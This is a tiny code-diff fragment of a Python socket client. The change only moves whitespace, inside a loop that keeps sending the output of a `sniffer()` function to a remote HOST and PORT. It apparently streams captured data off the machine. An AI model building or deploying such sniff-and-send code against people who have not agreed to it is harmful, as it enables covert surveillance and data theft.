@@ -46,8 +46,8 @@ s = socket.socket()
 try:
     # Connect to server and send data
     sock.connect((HOST, PORT))
+
     while True:
-            
             sock.sendall(sniffer())
 
     # Receive data from the server and shut down
